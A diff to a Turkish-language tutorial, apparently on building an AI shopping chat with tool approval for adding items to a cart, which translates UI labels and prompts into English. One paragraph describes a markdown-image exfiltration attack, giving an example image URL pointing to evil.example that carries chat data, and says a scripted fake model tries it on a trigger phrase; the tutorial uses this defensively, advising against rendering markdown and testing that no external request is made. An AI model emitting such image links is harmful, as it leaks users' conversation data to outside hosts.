@@ -65,17 +65,17 @@ Onay mekanizması `toolApproval` ile gelir. `addToCart` için `'user-approval'` 
 
 ```text
 src/components/Chat.tsx içindeki useChat'i kur, src/components/ProductCard.tsx içinde ürün kartını yaz.
-searchProducts sonucu ürün kartları olarak gösterilsin. Karta basınca "<id> sepete ekle" mesajı gitsin.
-addToCart onay beklerken Onayla ve Vazgeç butonları çıksın. Cevap verilince otomatik devam etsin.
+searchProducts sonucu ürün kartları olarak gösterilsin. Karta basınca "add <id> to cart" mesajı gitsin.
+addToCart onay beklerken Approve ve Dismiss butonları çıksın. Cevap verilince otomatik devam etsin.
 Asistan metnini düz metin olarak göster, markdown render etme.
 Sepet sayısı "Cart: N items" olarak /api/cart'tan gelsin.
 ```
 
 `useChat` araç parçalarını `tool-<ad>` türüyle verir. Onay beklerken durum `approval-requested` olur ve `addToolApprovalResponse` ile cevap gönderilir.[^4]
 
-Asistan metnini markdown olarak render etmeyin. Modelin yazdığı `![](https://kotu.example/c.png?d=...)` gibi bir görsel adresi, sayfa açılınca tarayıcıyı o adrese götürür ve sohbet verisini dışarı sızdırabilir.[^5] Sahte model, "skip the summary" yazdığınızda tam bunu dener.
+Asistan metnini markdown olarak render etmeyin. Modelin yazdığı `![](https://evil.example/c.png?d=...)` gibi bir görsel adresi, sayfa açılınca tarayıcıyı o adrese götürür ve sohbet verisini dışarı sızdırabilir.[^5] Sahte model, "give me a summary" yazdığınızda tam bunu dener.
 
-**Kontrol:** Uçtan uca testlerde "onay ister", "dismissing leaves the cart unchanged" ve "dış görsel için istek atılmaz" yeşil mi? Tarayıcıda `npm run dev` ile de deneyin: `show me running shoes`, sonra bir kartta **Sepete ekle**, sonra **Onayla**.
+**Kontrol:** Uçtan uca testlerde "onay ister", "dismissing leaves the cart unchanged" ve "dış görsel için istek atılmaz" yeşil mi? Tarayıcıda `npm run dev` ile de deneyin: `show me running shoes`, sonra bir kartta **Add to cart**, sonra **Approve**.
 
 ## Adım 4: Sınırları yazdırın
 
